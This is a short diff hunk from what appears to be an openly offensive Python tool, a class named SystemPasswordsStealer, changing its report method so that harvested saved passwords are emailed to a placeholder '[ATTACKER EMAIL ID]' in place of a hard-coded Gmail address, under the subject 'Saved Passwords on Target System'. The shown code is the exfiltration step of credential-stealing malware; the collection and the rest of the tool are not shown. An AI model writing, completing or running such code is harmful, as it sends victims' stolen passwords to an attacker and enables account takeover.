@@ -28,7 +28,7 @@ class SystemPasswordsStealer:
             self.passwords = f"Error during execution: {e}"
 
     def report(self, mail_body):
-        self.mailer.send_mail("hack3d.txt@gmail.com", "Saved Passwords on Target System", mail_body)
+        self.mailer.send_mail("[ATTACKER EMAIL ID]", "Saved Passwords on Target System", mail_body)
 
     def start(self):
         self.get_passwords()
